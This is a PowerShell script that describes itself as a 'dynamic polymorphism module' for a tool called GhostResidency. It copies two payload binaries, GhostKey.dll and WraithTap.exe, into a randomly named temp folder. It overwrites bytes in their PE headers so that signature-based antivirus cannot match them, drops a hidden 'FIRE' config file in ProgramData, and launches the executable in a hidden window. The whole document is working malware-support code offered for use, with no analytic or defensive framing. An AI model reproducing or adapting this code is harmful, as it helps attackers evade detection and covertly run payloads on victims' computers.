# GhostPolymorph.ps1
# Dynamic polymorphism module for GhostResidency.ps1
# Randomizes GhostKey.dll and WraithTap.exe at runtime for evasion

param(
    [string]$GhostKeyDLL = "$PSScriptRoot\GhostKey.dll",
    [string]$WraithTapEXE = "$PSScriptRoot\WraithTap.exe"
)

function Random-String($length = 6) {
    -join ((48..57) + (65..90) + (97..122) | Get-Random -Count $length | ForEach-Object {[char]$_})
}

function Stamp-PEHeader {
    param($file)
    try {
        $bytes = [System.IO.File]::ReadAllBytes($file)
        $rand = Get-Random -Minimum 100000 -Maximum 999999
        for ($i = 128; $i -lt 144; $i++) {
            $bytes[$i] = ($rand % 256); $rand = [math]::Floor($rand / 256)
        }
        [System.IO.File]::WriteAllBytes($file, $bytes)
    } catch {
        Write-Host "[-] Failed to mutate header of $file"
    }
}

function Invoke-GhostPolymorph {
    if (!(Test-Path $GhostKeyDLL) -or !(Test-Path $WraithTapEXE)) {
        Write-Host "[-] Required payloads not found."
        return $null
    }

    $tag = Random-String 4
    $userTemp = "$env:LOCALAPPDATA\\Temp\\Ghost_$tag"

    if (!(Test-Path $userTemp)) {
        New-Item -ItemType Directory -Path $userTemp -Force | Out-Null
    }

    $newDLL = "GhostKey_$tag.dll"
    $newEXE = "WraithTap_$tag.exe"
    $outDLL = Join-Path $userTemp $newDLL
    $outEXE = Join-Path $userTemp $newEXE

    Copy-Item $GhostKeyDLL $outDLL -Force
    Copy-Item $WraithTapEXE $outEXE -Force
    Stamp-PEHeader $outDLL
    Stamp-PEHeader $outEXE

    $ghostCfg = @{ command = "FIRE"; timestamp = (Get-Date).ToUniversalTime().ToString("o"); ghostTag = $tag }
    $cfgPath = "C:\\ProgramData\\.ghost.cfg"
    $ghostCfg | ConvertTo-Json | Set-Content -Path $cfgPath -Force

    return @{ dll = $outDLL; exe = $outEXE; tag = $tag }
}

# Automatically invoke on execution if within GhostResidency
$caller = $MyInvocation.InvocationName
if ($caller -like "*GhostResidency*") {
    $poly = Invoke-GhostPolymorph
    if ($poly) {
        Start-Process -WindowStyle Hidden -FilePath $poly.exe -ArgumentList $poly.dll
    }
}
